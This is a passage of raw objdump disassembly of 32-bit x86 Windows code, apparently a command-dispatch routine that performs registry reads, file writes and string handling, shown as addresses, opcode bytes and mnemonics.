  4024e7:	0f 84 69 07 00 00    	je     0x402c56
  4024ed:	33 c0                	xor    %eax,%eax
  4024ef:	83 fe 01             	cmp    $0x1,%esi
  4024f2:	bf f0 b5 40 00       	mov    $0x40b5f0,%edi
  4024f7:	75 11                	jne    0x40250a
  4024f9:	6a 23                	push   $0x23
  4024fb:	e8 d2 08 00 00       	call   0x402dd2
  402500:	57                   	push   %edi
  402501:	e8 cf 40 00 00       	call   0x4065d5
  402506:	8d 44 00 02          	lea    0x2(%eax,%eax,1),%eax
  40250a:	83 fe 04             	cmp    $0x4,%esi
  40250d:	75 12                	jne    0x402521
  40250f:	6a 03                	push   $0x3
  402511:	e8 9a 08 00 00       	call   0x402db0
  402516:	59                   	pop    %ecx
  402517:	a3 f0 b5 40 00       	mov    %eax,0x40b5f0
  40251c:	56                   	push   %esi
  40251d:	89 55 c8             	mov    %edx,-0x38(%ebp)
  402520:	58                   	pop    %eax
  402521:	83 fe 03             	cmp    $0x3,%esi
  402524:	75 0f                	jne    0x402535
  402526:	68 00 18 00 00       	push   $0x1800
  40252b:	57                   	push   %edi
  40252c:	53                   	push   %ebx
  40252d:	ff 75 dc             	push   -0x24(%ebp)
  402530:	e8 df 0d 00 00       	call   0x403314
  402535:	50                   	push   %eax
  402536:	57                   	push   %edi
  402537:	ff 75 f0             	push   -0x10(%ebp)
  40253a:	53                   	push   %ebx
  40253b:	ff 75 bc             	push   -0x44(%ebp)
  40253e:	ff 75 08             	push   0x8(%ebp)
  402541:	ff 15 0c 80 40 00    	call   *0x40800c
  402547:	85 c0                	test   %eax,%eax
  402549:	75 03                	jne    0x40254e
  40254b:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40254e:	ff 75 08             	push   0x8(%ebp)
  402551:	e9 d3 00 00 00       	jmp    0x402629
  402556:	68 19 00 02 00       	push   $0x20019
  40255b:	e8 b2 08 00 00       	call   0x402e12
  402560:	6a 33                	push   $0x33
  402562:	8b f0                	mov    %eax,%esi
  402564:	e8 69 08 00 00       	call   0x402dd2
  402569:	3b f3                	cmp    %ebx,%esi
  40256b:	66 89 1f             	mov    %bx,(%edi)
  40256e:	0f 84 e6 03 00 00    	je     0x40295a
  402574:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402577:	c7 45 f0 00 08 00 00 	movl   $0x800,-0x10(%ebp)
  40257e:	51                   	push   %ecx
  40257f:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402582:	57                   	push   %edi
  402583:	51                   	push   %ecx
  402584:	53                   	push   %ebx
  402585:	50                   	push   %eax
  402586:	56                   	push   %esi
  402587:	ff 15 08 80 40 00    	call   *0x408008
  40258d:	33 c9                	xor    %ecx,%ecx
  40258f:	41                   	inc    %ecx
  402590:	85 c0                	test   %eax,%eax
  402592:	75 2e                	jne    0x4025c2
  402594:	83 7d 08 04          	cmpl   $0x4,0x8(%ebp)
  402598:	74 13                	je     0x4025ad
  40259a:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  40259d:	74 06                	je     0x4025a5
  40259f:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  4025a3:	75 1d                	jne    0x4025c2
  4025a5:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4025a8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4025ab:	eb 74                	jmp    0x402621
  4025ad:	ff 37                	push   (%edi)
  4025af:	33 c0                	xor    %eax,%eax
  4025b1:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4025b4:	57                   	push   %edi
  4025b5:	0f 94 c0             	sete   %al
  4025b8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4025bb:	e8 46 3f 00 00       	call   0x406506
  4025c0:	eb 66                	jmp    0x402628
  4025c2:	66 89 1f             	mov    %bx,(%edi)
  4025c5:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4025c8:	eb 5e                	jmp    0x402628
  4025ca:	68 19 00 02 00       	push   $0x20019
  4025cf:	e8 3e 08 00 00       	call   0x402e12
  4025d4:	6a 03                	push   $0x3
  4025d6:	8b f0                	mov    %eax,%esi
  4025d8:	e8 d3 07 00 00       	call   0x402db0
  4025dd:	3b f3                	cmp    %ebx,%esi
  4025df:	59                   	pop    %ecx
  4025e0:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4025e3:	66 89 1f             	mov    %bx,(%edi)
  4025e6:	0f 84 6e 03 00 00    	je     0x40295a
  4025ec:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4025ef:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  4025f4:	89 4d 08             	mov    %ecx,0x8(%ebp)
  4025f7:	74 0c                	je     0x402605
  4025f9:	51                   	push   %ecx
  4025fa:	57                   	push   %edi
  4025fb:	50                   	push   %eax
  4025fc:	56                   	push   %esi
  4025fd:	ff 15 04 80 40 00    	call   *0x408004
  402603:	eb 1c                	jmp    0x402621
  402605:	53                   	push   %ebx
  402606:	53                   	push   %ebx
  402607:	53                   	push   %ebx
  402608:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40260b:	53                   	push   %ebx
  40260c:	51                   	push   %ecx
  40260d:	57                   	push   %edi
  40260e:	50                   	push   %eax
  40260f:	56                   	push   %esi
  402610:	ff 15 00 80 40 00    	call   *0x408000
  402616:	85 c0                	test   %eax,%eax
  402618:	74 07                	je     0x402621
  40261a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402621:	66 89 9f fe 07 00 00 	mov    %bx,0x7fe(%edi)
  402628:	56                   	push   %esi
  402629:	ff 15 10 80 40 00    	call   *0x408010
  40262f:	e9 22 06 00 00       	jmp    0x402c56
  402634:	57                   	push   %edi
  402635:	e8 e5 3e 00 00       	call   0x40651f
  40263a:	3b c3                	cmp    %ebx,%eax
  40263c:	0f 84 14 06 00 00    	je     0x402c56
  402642:	50                   	push   %eax
  402643:	e9 cf f9 ff ff       	jmp    0x402017
  402648:	6a ed                	push   $0xffffffed
  40264a:	e8 83 07 00 00       	call   0x402dd2
  40264f:	ff 75 d8             	push   -0x28(%ebp)
  402652:	ff 75 d4             	push   -0x2c(%ebp)
  402655:	50                   	push   %eax
  402656:	e8 54 3a 00 00       	call   0x4060af
  40265b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40265e:	0f 84 f3 02 00 00    	je     0x402957
  402664:	50                   	push   %eax
  402665:	e9 28 ef ff ff       	jmp    0x401592
  40266a:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40266d:	33 c9                	xor    %ecx,%ecx
  40266f:	83 fa 38             	cmp    $0x38,%edx
  402672:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402675:	0f 94 c1             	sete   %cl
  402678:	3b c3                	cmp    %ebx,%eax
  40267a:	8b f1                	mov    %ecx,%esi
  40267c:	74 1b                	je     0x402699
  40267e:	6a 01                	push   $0x1
  402680:	e8 2b 07 00 00       	call   0x402db0
  402685:	66 a3 f0 ad 40 00    	mov    %ax,0x40adf0
  40268b:	33 c0                	xor    %eax,%eax
  40268d:	3b f3                	cmp    %ebx,%esi
  40268f:	59                   	pop    %ecx
  402690:	0f 94 c0             	sete   %al
  402693:	89 55 bc             	mov    %edx,-0x44(%ebp)
  402696:	40                   	inc    %eax
  402697:	eb 3f                	jmp    0x4026d8
  402699:	83 fa 38             	cmp    $0x38,%edx
  40269c:	75 2b                	jne    0x4026c9
  40269e:	6a 21                	push   $0x21
  4026a0:	e8 2d 07 00 00       	call   0x402dd2
  4026a5:	68 00 04 00 00       	push   $0x400
  4026aa:	68 f0 ad 40 00       	push   $0x40adf0
  4026af:	68 f0 b5 40 00       	push   $0x40b5f0
  4026b4:	e8 28 3f 00 00       	call   0x4065e1
  4026b9:	83 c4 0c             	add    $0xc,%esp
  4026bc:	68 f0 ad 40 00       	push   $0x40adf0
  4026c1:	ff 15 28 81 40 00    	call   *0x408128
  4026c7:	eb 0f                	jmp    0x4026d8
  4026c9:	6a 11                	push   $0x11
  4026cb:	e8 02 07 00 00       	call   0x402dd2
  4026d0:	50                   	push   %eax
  4026d1:	e8 ff 3e 00 00       	call   0x4065d5
  4026d6:	03 c0                	add    %eax,%eax
  4026d8:	66 39 1f             	cmp    %bx,(%edi)
  4026db:	89 45 08             	mov    %eax,0x8(%ebp)
  4026de:	0f 84 76 02 00 00    	je     0x40295a
  4026e4:	57                   	push   %edi
  4026e5:	e8 35 3e 00 00       	call   0x40651f
  4026ea:	0b 75 f0             	or     -0x10(%ebp),%esi
  4026ed:	8b f8                	mov    %eax,%edi
  4026ef:	75 14                	jne    0x402705
  4026f1:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  4026f4:	74 0f                	je     0x402705
  4026f6:	57                   	push   %edi
  4026f7:	57                   	push   %edi
  4026f8:	e8 93 3a 00 00       	call   0x406190
  4026fd:	85 c0                	test   %eax,%eax
  4026ff:	0f 8c 55 02 00 00    	jl     0x40295a
  402705:	ff 75 08             	push   0x8(%ebp)
  402708:	68 f0 ad 40 00       	push   $0x40adf0
  40270d:	57                   	push   %edi
  40270e:	e8 4e 3a 00 00       	call   0x406161
  402713:	e9 c1 ee ff ff       	jmp    0x4015d9
  402718:	6a 02                	push   $0x2
  40271a:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  40271d:	58                   	pop    %eax
  40271e:	50                   	push   %eax
  40271f:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  402722:	e8 89 06 00 00       	call   0x402db0
  402727:	83 f8 01             	cmp    $0x1,%eax
  40272a:	59                   	pop    %ecx
  40272b:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40272e:	89 45 bc             	mov    %eax,-0x44(%ebp)
  402731:	0f 8c 1f 05 00 00    	jl     0x402c56
  402737:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  40273c:	3b c1                	cmp    %ecx,%eax
  40273e:	7e 03                	jle    0x402743
  402740:	89 4d bc             	mov    %ecx,-0x44(%ebp)
  402743:	66 39 1f             	cmp    %bx,(%edi)
  402746:	0f 84 5e 01 00 00    	je     0x4028aa
  40274c:	57                   	push   %edi
  40274d:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  402750:	e8 ca 3d 00 00       	call   0x40651f
  402755:	39 5d bc             	cmp    %ebx,-0x44(%ebp)
  402758:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40275b:	0f 8e 49 01 00 00    	jle    0x4028aa
  402761:	8b 35 2c 81 40 00    	mov    0x40812c,%esi
  402767:	83 7d cc 39          	cmpl   $0x39,-0x34(%ebp)
  40276b:	0f 85 8f 00 00 00    	jne    0x402800
  402771:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402774:	53                   	push   %ebx
  402775:	50                   	push   %eax
  402776:	6a 02                	push   $0x2
  402778:	58                   	pop    %eax
  402779:	2b 45 dc             	sub    -0x24(%ebp),%eax
  40277c:	50                   	push   %eax
  40277d:	8d 45 0a             	lea    0xa(%ebp),%eax
  402780:	50                   	push   %eax
  402781:	ff 75 e8             	push   -0x18(%ebp)
  402784:	ff 15 30 81 40 00    	call   *0x408130
  40278a:	85 c0                	test   %eax,%eax
  40278c:	0f 84 18 01 00 00    	je     0x4028aa
  402792:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  402795:	3b cb                	cmp    %ebx,%ecx
  402797:	0f 84 0d 01 00 00    	je     0x4028aa
  40279d:	66 0f b6 45 0a       	movzbw 0xa(%ebp),%ax
  4027a2:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  4027a5:	89 4d b4             	mov    %ecx,-0x4c(%ebp)
  4027a8:	89 45 b0             	mov    %eax,-0x50(%ebp)
  4027ab:	0f 85 b5 00 00 00    	jne    0x402866
  4027b1:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4027b4:	6a 01                	push   $0x1
  4027b6:	50                   	push   %eax
  4027b7:	8d 45 0a             	lea    0xa(%ebp),%eax
  4027ba:	51                   	push   %ecx
  4027bb:	50                   	push   %eax
  4027bc:	6a 08                	push   $0x8
  4027be:	53                   	push   %ebx
  4027bf:	ff d6                	call   *%esi
  4027c1:	85 c0                	test   %eax,%eax
  4027c3:	75 68                	jne    0x40282d
  4027c5:	8b 7d b4             	mov    -0x4c(%ebp),%edi
  4027c8:	f7 df                	neg    %edi
  4027ca:	ff 4d c0             	decl   -0x40(%ebp)
  4027cd:	b8 fd ff 00 00       	mov    $0xfffd,%eax
  4027d2:	89 45 b0             	mov    %eax,-0x50(%ebp)
  4027d5:	74 59                	je     0x402830
  4027d7:	ff 4d b4             	decl   -0x4c(%ebp)
  4027da:	47                   	inc    %edi
  4027db:	6a 01                	push   $0x1
  4027dd:	53                   	push   %ebx
  4027de:	57                   	push   %edi
  4027df:	ff 75 e8             	push   -0x18(%ebp)
  4027e2:	ff 15 34 81 40 00    	call   *0x408134
  4027e8:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4027eb:	6a 01                	push   $0x1
  4027ed:	50                   	push   %eax
  4027ee:	8d 45 0a             	lea    0xa(%ebp),%eax
  4027f1:	ff 75 c0             	push   -0x40(%ebp)
  4027f4:	50                   	push   %eax
  4027f5:	6a 08                	push   $0x8
  4027f7:	53                   	push   %ebx
  4027f8:	ff d6                	call   *%esi
  4027fa:	85 c0                	test   %eax,%eax
  4027fc:	74 cc                	je     0x4027ca
  4027fe:	eb 2d                	jmp    0x40282d
  402800:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402803:	75 16                	jne    0x40281b
  402805:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  402808:	75 11                	jne    0x40281b
  40280a:	53                   	push   %ebx
  40280b:	ff 75 e8             	push   -0x18(%ebp)
  40280e:	e8 7d 39 00 00       	call   0x406190
  402813:	85 c0                	test   %eax,%eax
  402815:	0f 8c 8f 00 00 00    	jl     0x4028aa
  40281b:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40281e:	6a 02                	push   $0x2
  402820:	50                   	push   %eax
  402821:	ff 75 e8             	push   -0x18(%ebp)
  402824:	e8 09 39 00 00       	call   0x406132
  402829:	85 c0                	test   %eax,%eax
  40282b:	74 7d                	je     0x4028aa
  40282d:	8b 45 b0             	mov    -0x50(%ebp),%eax
  402830:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402833:	75 31                	jne    0x402866
  402835:	66 83 7d c8 0d       	cmpw   $0xd,-0x38(%ebp)
  40283a:	74 3b                	je     0x402877
  40283c:	66 83 7d c8 0a       	cmpw   $0xa,-0x38(%ebp)
  402841:	74 34                	je     0x402877
  402843:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402846:	8b 55 f8             	mov    -0x8(%ebp),%edx
  402849:	ff 45 f8             	incl   -0x8(%ebp)
  40284c:	66 3b c3             	cmp    %bx,%ax
  40284f:	66 89 04 51          	mov    %ax,(%ecx,%edx,2)
  402853:	89 45 c8             	mov    %eax,-0x38(%ebp)
  402856:	74 52                	je     0x4028aa
  402858:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40285b:	3b 45 bc             	cmp    -0x44(%ebp),%eax
  40285e:	0f 8c 03 ff ff ff    	jl     0x402767
  402864:	eb 44                	jmp    0x4028aa
  402866:	0f b7 c0             	movzwl %ax,%eax
  402869:	50                   	push   %eax
  40286a:	ff 75 f4             	push   -0xc(%ebp)
  40286d:	e8 94 3c 00 00       	call   0x406506
  402872:	e9 e8 03 00 00       	jmp    0x402c5f
  402877:	66 39 45 c8          	cmp    %ax,-0x38(%ebp)
  40287b:	74 1b                	je     0x402898
  40287d:	66 3d 0d 00          	cmp    $0xd,%ax
  402881:	74 06                	je     0x402889
  402883:	66 3d 0a 00          	cmp    $0xa,%ax
  402887:	75 0f                	jne    0x402898
  402889:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40288c:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40288f:	ff 45 f8             	incl   -0x8(%ebp)
  402892:	66 89 04 51          	mov    %ax,(%ecx,%edx,2)
  402896:	eb 12                	jmp    0x4028aa
  402898:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  40289b:	6a 01                	push   $0x1
  40289d:	f7 d8                	neg    %eax
  40289f:	53                   	push   %ebx
  4028a0:	50                   	push   %eax
  4028a1:	ff 75 e8             	push   -0x18(%ebp)
  4028a4:	ff 15 34 81 40 00    	call   *0x408134
  4028aa:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4028ad:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4028b0:	3b c3                	cmp    %ebx,%eax
  4028b2:	66 89 1c 41          	mov    %bx,(%ecx,%eax,2)
  4028b6:	e9 20 ed ff ff       	jmp    0x4015db
  4028bb:	66 39 1f             	cmp    %bx,(%edi)
  4028be:	0f 84 92 03 00 00    	je     0x402c56
  4028c4:	6a 02                	push   $0x2
  4028c6:	e8 e5 04 00 00       	call   0x402db0
  4028cb:	59                   	pop    %ecx
  4028cc:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4028cf:	ff 75 dc             	push   -0x24(%ebp)
  4028d2:	53                   	push   %ebx
  4028d3:	50                   	push   %eax
  4028d4:	57                   	push   %edi
  4028d5:	e8 45 3c 00 00       	call   0x40651f
  4028da:	50                   	push   %eax
  4028db:	ff 15 34 81 40 00    	call   *0x408134
  4028e1:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  4028e4:	0f 8c 6c 03 00 00    	jl     0x402c56
  4028ea:	50                   	push   %eax
  4028eb:	e9 dd 02 00 00       	jmp    0x402bcd
  4028f0:	57                   	push   %edi
  4028f1:	e8 29 3c 00 00       	call   0x40651f
  4028f6:	3b c3                	cmp    %ebx,%eax
  4028f8:	0f 84 58 03 00 00    	je     0x402c56
  4028fe:	50                   	push   %eax
  4028ff:	ff 15 38 81 40 00    	call   *0x408138
  402905:	e9 4c 03 00 00       	jmp    0x402c56
  40290a:	ff 75 f4             	push   -0xc(%ebp)
  40290d:	e8 0d 3c 00 00       	call   0x40651f
  402912:	3b c3                	cmp    %ebx,%eax
  402914:	74 12                	je     0x402928
  402916:	8d 8d 24 fd ff ff    	lea    -0x2dc(%ebp),%ecx
  40291c:	51                   	push   %ecx
  40291d:	50                   	push   %eax
  40291e:	ff 15 3c 81 40 00    	call   *0x40813c
  402924:	85 c0                	test   %eax,%eax
  402926:	75 47                	jne    0x40296f
  402928:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40292f:	66 89 1f             	mov    %bx,(%edi)
  402932:	e9 1f 03 00 00       	jmp    0x402c56
  402937:	6a 02                	push   $0x2
  402939:	e8 94 04 00 00       	call   0x402dd2
  40293e:	8d 8d 24 fd ff ff    	lea    -0x2dc(%ebp),%ecx
  402944:	51                   	push   %ecx
  402945:	50                   	push   %eax
  402946:	ff 15 40 81 40 00    	call   *0x408140
  40294c:	83 f8 ff             	cmp    $0xffffffff,%eax
  40294f:	75 15                	jne    0x402966
  402951:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402954:	66 89 18             	mov    %bx,(%eax)
  402957:	66 89 1f             	mov    %bx,(%edi)
  40295a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402961:	e9 f0 02 00 00       	jmp    0x402c56
  402966:	50                   	push   %eax
  402967:	ff 75 f4             	push   -0xc(%ebp)
  40296a:	e8 97 3b 00 00       	call   0x406506
  40296f:	8d 85 50 fd ff ff    	lea    -0x2b0(%ebp),%eax
  402975:	50                   	push   %eax
  402976:	57                   	push   %edi
  402977:	e9 44 01 00 00       	jmp    0x402ac0
  40297c:	6a f0                	push   $0xfffffff0
  40297e:	bf 66 fd ff ff       	mov    $0xfffffd66,%edi
  402983:	e8 4a 04 00 00       	call   0x402dd2
  402988:	8b f0                	mov    %eax,%esi
  40298a:	56                   	push   %esi
  40298b:	89 75 c0             	mov    %esi,-0x40(%ebp)
  40298e:	e8 72 35 00 00       	call   0x405f05
  402993:	85 c0                	test   %eax,%eax
  402995:	75 07                	jne    0x40299e
  402997:	6a ed                	push   $0xffffffed
  402999:	e8 34 04 00 00       	call   0x402dd2
  40299e:	56                   	push   %esi
  40299f:	e8 e6 36 00 00       	call   0x40608a
  4029a4:	6a 02                	push   $0x2
  4029a6:	68 00 00 00 40       	push   $0x40000000
  4029ab:	56                   	push   %esi
  4029ac:	e8 fe 36 00 00       	call   0x4060af
  4029b1:	83 f8 ff             	cmp    $0xffffffff,%eax
  4029b4:	89 45 08             	mov    %eax,0x8(%ebp)
  4029b7:	0f 84 aa 00 00 00    	je     0x402a67
  4029bd:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4029c0:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  4029c3:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4029c6:	0f 84 83 00 00 00    	je     0x402a4f
  4029cc:	a1 14 47 43 00       	mov    0x434714,%eax
  4029d1:	8b 35 10 81 40 00    	mov    0x408110,%esi
  4029d7:	50                   	push   %eax
  4029d8:	6a 40                	push   $0x40
  4029da:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4029dd:	ff d6                	call   *%esi
  4029df:	8b f8                	mov    %eax,%edi
  4029e1:	3b fb                	cmp    %ebx,%edi
  4029e3:	74 6a                	je     0x402a4f
  4029e5:	53                   	push   %ebx
  4029e6:	e8 5a 0b 00 00       	call   0x403545
  4029eb:	ff 75 bc             	push   -0x44(%ebp)
  4029ee:	57                   	push   %edi
  4029ef:	e8 3b 0b 00 00       	call   0x40352f
  4029f4:	ff 75 d8             	push   -0x28(%ebp)
  4029f7:	6a 40                	push   $0x40
  4029f9:	ff d6                	call   *%esi
  4029fb:	8b f0                	mov    %eax,%esi
  4029fd:	3b f3                	cmp    %ebx,%esi
  4029ff:	89 75 f0             	mov    %esi,-0x10(%ebp)
  402a02:	74 34                	je     0x402a38
  402a04:	ff 75 d8             	push   -0x28(%ebp)
  402a07:	56                   	push   %esi
  402a08:	53                   	push   %ebx
  402a09:	ff 75 d4             	push   -0x2c(%ebp)
  402a0c:	e8 03 09 00 00       	call   0x403314
  402a11:	eb 18                	jmp    0x402a2b
  402a13:	8b 0e                	mov    (%esi),%ecx
  402a15:	8b 46 04             	mov    0x4(%esi),%eax
  402a18:	83 c6 08             	add    $0x8,%esi
  402a1b:	51                   	push   %ecx
  402a1c:	03 c7                	add    %edi,%eax
  402a1e:	56                   	push   %esi
  402a1f:	50                   	push   %eax
  402a20:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  402a23:	e8 42 36 00 00       	call   0x40606a
  402a28:	03 75 c4             	add    -0x3c(%ebp),%esi
  402a2b:	38 1e                	cmp    %bl,(%esi)
  402a2d:	75 e4                	jne    0x402a13
  402a2f:	ff 75 f0             	push   -0x10(%ebp)
  402a32:	ff 15 0c 81 40 00    	call   *0x40810c
  402a38:	ff 75 bc             	push   -0x44(%ebp)
  402a3b:	57                   	push   %edi
  402a3c:	ff 75 08             	push   0x8(%ebp)
  402a3f:	e8 1d 37 00 00       	call   0x406161
  402a44:	57                   	push   %edi
  402a45:	ff 15 0c 81 40 00    	call   *0x40810c
  402a4b:	83 4d c8 ff          	orl    $0xffffffff,-0x38(%ebp)
  402a4f:	53                   	push   %ebx
  402a50:	53                   	push   %ebx
  402a51:	ff 75 08             	push   0x8(%ebp)
  402a54:	ff 75 c8             	push   -0x38(%ebp)
  402a57:	e8 b8 08 00 00       	call   0x403314
  402a5c:	ff 75 08             	push   0x8(%ebp)
  402a5f:	8b f8                	mov    %eax,%edi
  402a61:	ff 15 fc 80 40 00    	call   *0x4080fc
  402a67:	6a f3                	push   $0xfffffff3
  402a69:	3b fb                	cmp    %ebx,%edi
  402a6b:	5e                   	pop    %esi
  402a6c:	7d 13                	jge    0x402a81
  402a6e:	6a ef                	push   $0xffffffef
  402a70:	5e                   	pop    %esi
  402a71:	ff 75 c0             	push   -0x40(%ebp)
  402a74:	ff 15 44 81 40 00    	call   *0x408144
  402a7a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402a81:	56                   	push   %esi
  402a82:	e9 96 f8 ff ff       	jmp    0x40231d
  402a87:	53                   	push   %ebx
  402a88:	e8 23 03 00 00       	call   0x402db0
  402a8d:	8b f8                	mov    %eax,%edi
  402a8f:	59                   	pop    %ecx
  402a90:	3b 3d 2c 47 43 00    	cmp    0x43472c,%edi
  402a96:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402a99:	0f 83 bb fe ff ff    	jae    0x40295a
  402a9f:	8b f7                	mov    %edi,%esi
  402aa1:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402aa4:	69 f6 18 08 00 00    	imul   $0x818,%esi,%esi
  402aaa:	03 35 28 47 43 00    	add    0x434728,%esi
  402ab0:	3b c3                	cmp    %ebx,%eax
  402ab2:	7c 1c                	jl     0x402ad0
  402ab4:	8b 0c 86             	mov    (%esi,%eax,4),%ecx
  402ab7:	75 11                	jne    0x402aca
  402ab9:	83 c6 18             	add    $0x18,%esi
  402abc:	56                   	push   %esi
  402abd:	ff 75 f4             	push   -0xc(%ebp)
  402ac0:	e8 fa 3a 00 00       	call   0x4065bf
  402ac5:	e9 8c 01 00 00       	jmp    0x402c56
  402aca:	51                   	push   %ecx
  402acb:	e9 fd 00 00 00       	jmp    0x402bcd
  402ad0:	83 c9 ff             	or     $0xffffffff,%ecx
  402ad3:	2b c8                	sub    %eax,%ecx
  402ad5:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  402ad8:	74 10                	je     0x402aea
  402ada:	6a 01                	push   $0x1
  402adc:	e8 cf 02 00 00       	call   0x402db0
  402ae1:	59                   	pop    %ecx
  402ae2:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402ae5:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  402ae8:	eb 10                	jmp    0x402afa
  402aea:	ff 75 e0             	push   -0x20(%ebp)
  402aed:	8d 46 18             	lea    0x18(%esi),%eax
  402af0:	50                   	push   %eax
  402af1:	e8 06 3b 00 00       	call   0x4065fc
  402af6:	80 4e 09 01          	orb    $0x1,0x9(%esi)
  402afa:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402afd:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  402b00:	89 0c 86             	mov    %ecx,(%esi,%eax,4)
  402b03:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402b06:	0f 84 4a 01 00 00    	je     0x402c56
  402b0c:	57                   	push   %edi
  402b0d:	e8 6b e6 ff ff       	call   0x40117d
  402b12:	e9 3f 01 00 00       	jmp    0x402c56
  402b17:	53                   	push   %ebx
  402b18:	e8 93 02 00 00       	call   0x402db0
  402b1d:	83 f8 20             	cmp    $0x20,%eax
  402b20:	59                   	pop    %ecx
  402b21:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402b24:	0f 83 30 fe ff ff    	jae    0x40295a
  402b2a:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402b2d:	74 22                	je     0x402b51
  402b2f:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  402b32:	74 12                	je     0x402b46
  402b34:	50                   	push   %eax
  402b35:	e8 5f e7 ff ff       	call   0x401299
  402b3a:	53                   	push   %ebx
  402b3b:	53                   	push   %ebx
  402b3c:	e8 ae e6 ff ff       	call   0x4011ef
  402b41:	e9 10 01 00 00       	jmp    0x402c56
  402b46:	53                   	push   %ebx
  402b47:	e8 96 e7 ff ff       	call   0x4012e2
  402b4c:	e9 99 fd ff ff       	jmp    0x4028ea
  402b51:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  402b54:	74 15                	je     0x402b6b
  402b56:	8b 15 10 47 43 00    	mov    0x434710,%edx
  402b5c:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  402b5f:	89 8c 82 94 00 00 00 	mov    %ecx,0x94(%edx,%eax,4)
  402b66:	e9 eb 00 00 00       	jmp    0x402c56
  402b6b:	8b 0d 10 47 43 00    	mov    0x434710,%ecx
  402b71:	ff b4 81 94 00 00 00 	push   0x94(%ecx,%eax,4)
  402b78:	ff 75 f4             	push   -0xc(%ebp)
  402b7b:	e8 7c 3a 00 00       	call   0x4065fc
  402b80:	e9 d1 00 00 00       	jmp    0x402c56
  402b85:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402b88:	2b c3                	sub    %ebx,%eax
  402b8a:	74 4b                	je     0x402bd7
  402b8c:	48                   	dec    %eax
  402b8d:	0f 85 c3 00 00 00    	jne    0x402c56
  402b93:	6a 02                	push   $0x2
  402b95:	e8 16 02 00 00       	call   0x402db0
  402b9a:	6a 04                	push   $0x4
  402b9c:	8b f0                	mov    %eax,%esi
  402b9e:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402ba1:	e8 0a 02 00 00       	call   0x402db0
  402ba6:	59                   	pop    %ecx
  402ba7:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402baa:	59                   	pop    %ecx
  402bab:	89 5d 08             	mov    %ebx,0x8(%ebp)
  402bae:	0f b6 c8             	movzbl %al,%ecx
  402bb1:	c1 e8 18             	shr    $0x18,%eax
  402bb4:	3b f3                	cmp    %ebx,%esi
  402bb6:	75 05                	jne    0x402bbd
  402bb8:	be 80 47 43 00       	mov    $0x434780,%esi
  402bbd:	03 c6                	add    %esi,%eax
  402bbf:	51                   	push   %ecx
  402bc0:	50                   	push   %eax
  402bc1:	8d 45 08             	lea    0x8(%ebp),%eax
  402bc4:	50                   	push   %eax
  402bc5:	e8 a0 34 00 00       	call   0x40606a
  402bca:	ff 75 08             	push   0x8(%ebp)
  402bcd:	ff 75 f4             	push   -0xc(%ebp)
  402bd0:	e8 31 39 00 00       	call   0x406506
  402bd5:	eb 7f                	jmp    0x402c56
  402bd7:	6a 05                	push   $0x5
  402bd9:	e8 d5 3d 00 00       	call   0x4069b3
  402bde:	6a 22                	push   $0x22
